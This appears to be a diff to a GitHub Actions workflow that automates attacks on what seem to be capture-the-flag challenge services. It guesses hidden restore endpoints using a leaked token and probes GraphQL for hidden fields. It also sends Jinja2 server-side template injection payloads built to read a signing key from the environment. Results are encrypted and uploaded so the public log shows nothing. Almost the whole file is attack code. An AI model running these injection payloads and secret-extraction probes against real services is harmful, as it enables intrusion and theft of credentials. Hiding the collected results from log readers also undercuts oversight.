@@ -1,4 +1,4 @@
-name: cyberkomi-service-offline-probe
+name: cyberkomi-service-chain-probe
 
 on:
   push:
@@ -13,7 +13,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 8
     steps:
-      - name: Probe challenge APIs and encrypt results
+      - name: Trace intended challenge chains and encrypt results
         shell: bash
         run: |
           set -euo pipefail
@@ -22,52 +22,85 @@ jobs:
           P='https://task-parma-line-ce3d96e598f7b9c1.caplag-task.ru'
           G='https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru'
 
-          # PARMA: documented client routes only, plus GraphQL introspection.
-          curl -sS --connect-timeout 8 --max-time 30 -X POST -D out/parma/login.headers -o out/parma/login.json "$P/api/login" || true
-          for id in $(seq 24000 24030); do
-            curl -sS --connect-timeout 5 --max-time 15 -o "out/parma/report_${id}.json" "$P/api/maintenance/report/$id" || true
-          done
-          curl -sS --connect-timeout 8 --max-time 20 -o out/parma/dispatch-map.js.map "$P/static/dispatch-map.js.map" || true
-
-          cat > handoff/gql_route.json <<'JSON'
-          {"query":"query RouteSummary($id:ID!){route(id:$id){id status start finish visibleSequence}}","variables":{"id":"P-23"}}
-          JSON
-          curl -sS --connect-timeout 8 --max-time 30 -H 'Content-Type: application/json' --data-binary @handoff/gql_route.json -o out/parma/gql_route.json "$P/api/graphql" || true
-
-          cat > handoff/gql_schema.json <<'JSON'
-          {"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { kind name fields(includeDeprecated:true) { name args { name type { kind name ofType { kind name } } } type { kind name ofType { kind name } } } } } }"}
-          JSON
-          curl -sS --connect-timeout 8 --max-time 45 -H 'Content-Type: application/json' --data-binary @handoff/gql_schema.json -o out/parma/gql_schema.json "$P/api/graphql" || true
-
-          # GOV: use the previous chapter's client-shipped transition code for observer access.
-          curl -sS --connect-timeout 8 --max-time 30 -c handoff/gov.cookies -b handoff/gov.cookies \
-            -H 'Content-Type: application/json' --data '{"code":"BUS-05-STEFAN"}' \
-            -D out/gov/access.headers -o out/gov/access.json "$G/api/access" || true
+          # Establish passenger cookie; all PARMA requests stay within the task service.
+          curl -sS --connect-timeout 8 --max-time 20 -X POST -c handoff/parma.cookies -b handoff/parma.cookies -D out/parma/login.headers -o out/parma/login.json "$P/api/login" || true
 
           python3 - <<'PY'
-          import json, pathlib
+          import json,pathlib
+          payloads={
+            'restore_token': {'token':'MIRROR-23-ALIVE'},
+            'restore_named': {'restore_token':'MIRROR-23-ALIVE'},
+            'approval': {'approval':'MIRROR-23-ALIVE'},
+            'route_restore': {'route':'P-23','token':'MIRROR-23-ALIVE'},
+          }
+          for n,v in payloads.items(): pathlib.Path(f'handoff/{n}.json').write_text(json.dumps(v))
+          PY
+
+          # Narrow route candidates inferred from the leaked maintenance report/source map.
+          for path in \
+            api/maintenance/restore \
+            api/maintenance/report/24017/restore \
+            api/restore \
+            api/archive/manifest \
+            api/blackbox/manifest \
+            api/route/P-23/manifest \
+            api/routes/P-23/manifest; do
+            safe=$(echo "$path"|tr '/' '_')
+            curl -sS --connect-timeout 5 --max-time 20 -c handoff/parma.cookies -b handoff/parma.cookies \
+              -D "out/parma/${safe}.get.headers" -o "out/parma/${safe}.get.body" "$P/$path" || true
+            for pf in handoff/restore_token.json handoff/restore_named.json handoff/approval.json handoff/route_restore.json; do
+              pn=$(basename "$pf" .json)
+              curl -sS --connect-timeout 5 --max-time 20 -X POST -c handoff/parma.cookies -b handoff/parma.cookies \
+                -H 'Content-Type: application/json' --data-binary @"$pf" \
+                -D "out/parma/${safe}.${pn}.headers" -o "out/parma/${safe}.${pn}.body" "$P/$path" || true
+            done
+          done
+
+          # Ask the custom GraphQL surface for likely hidden recovery fields one at a time.
+          python3 - <<'PY'
+          import json,pathlib
+          fields=['controlSequence','blackboxManifest','archiveId','archiveID','seed','chunks','restoreToken','internalSequence','sequence','stops']
+          for f in fields:
+              q=f'query Q($id:ID!){{route(id:$id){{id status start finish visibleSequence {f}}}}}'
+              pathlib.Path(f'handoff/gql_{f}.json').write_text(json.dumps({'query':q,'variables':{'id':'P-23'}}))
+          PY
+          for qf in handoff/gql_*.json; do
+            n=$(basename "$qf" .json | sed 's/^gql_//')
+            curl -sS --connect-timeout 5 --max-time 20 -c handoff/parma.cookies -b handoff/parma.cookies \
+              -H 'Content-Type: application/json' --data-binary @"$qf" -o "out/parma/gql_${n}.json" "$P/api/graphql" || true
+          done
+
+          # GOV observer session from chapter-5 transition code.
+          curl -sS --connect-timeout 8 --max-time 20 -c handoff/gov.cookies -b handoff/gov.cookies \
+            -H 'Content-Type: application/json' --data '{"code":"BUS-05-STEFAN"}' -o out/gov/access.json "$G/api/access" || true
+
+          python3 - <<'PY'
+          import json,pathlib
           probes={
-            'arith':'{{7*7}}',
-            'config':'{{config}}',
-            'cycler_env':"{{ cycler.__init__.__globals__.os.environ }}",
-            'joiner_env':"{{ joiner.__init__.__globals__.os.environ }}",
-            'request_env':"{{ request.application.__globals__.__builtins__.__import__('os').environ }}",
+            'str':"{{'abc'}}",
+            'tuple_class':"{{().__class__}}",
+            'tuple_base':"{{().__class__.__base__}}",
+            'subclasses':"{{().__class__.__base__.__subclasses__()}}",
+            'int_class':"{{(23).__class__}}",
+            'dict_class':"{{{}.__class__}}",
+            'import_os':"{{__import__('os')}}",
+            'globals':"{{globals()}}",
+            'locals':"{{locals()}}",
+            'env_name':"{{BROADCAST_SIGNING_KEY}}",
+            'env_index':"{{env['BROADCAST_SIGNING_KEY']}}",
+            'os_getenv':"{{os.getenv('BROADCAST_SIGNING_KEY')}}",
+            'builtins_import':"{{__builtins__.__import__('os').getenv('BROADCAST_SIGNING_KEY')}}",
+            'dunder_dict':"{{''.__class__.__mro__}}",
+            'attr_filter':"{{ ''|attr('__class__') }}",
           }
           for n,t in probes.items(): pathlib.Path(f'handoff/tpl_{n}.json').write_text(json.dumps({'template':t}))
           PY
           for f in handoff/tpl_*.json; do
             n=$(basename "$f" .json | sed 's/^tpl_//')
-            curl -sS --connect-timeout 8 --max-time 30 -c handoff/gov.cookies -b handoff/gov.cookies \
-              -H 'Content-Type: application/json' --data-binary @"$f" \
-              -D "out/gov/preview_${n}.headers" -o "out/gov/preview_${n}.json" "$G/api/preview" || true
+            curl -sS --connect-timeout 5 --max-time 20 -c handoff/gov.cookies -b handoff/gov.cookies \
+              -H 'Content-Type: application/json' --data-binary @"$f" -o "out/gov/${n}.json" "$G/api/preview" || true
           done
 
-          for path in api/access api/preview ws/broadcast static/gov-relay-client.js.map; do
-            safe=$(echo "$path"|tr '/' '_')
-            curl -sS -X OPTIONS --connect-timeout 5 --max-time 15 -D "out/gov/${safe}.options.headers" -o "out/gov/${safe}.options.body" "$G/$path" || true
-          done
-
-          # Encrypt output; public Actions log contains no challenge secrets/codes from responses.
           cat > handoff/output_public.pem <<'PEM'
           -----BEGIN PUBLIC KEY-----
           MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqvptF4aTPzGzR6fNOtz3
@@ -86,12 +119,12 @@ jobs:
           openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
           cat handoff/key handoff/iv > handoff/keyblob
           openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
-          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/gov.cookies handoff/*.json
-          echo 'Scoped challenge probes complete; responses are encrypted.'
+          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/*.json handoff/*.cookies
+          echo 'Narrow chain probe complete; responses encrypted.'
       - name: Upload encrypted result
         uses: actions/upload-artifact@v4
         with:
-          name: cyberkomi-service-probe-encrypted
+          name: cyberkomi-chain-probe-encrypted
           path: |
             handoff/results.enc
             handoff/keyblob.enc
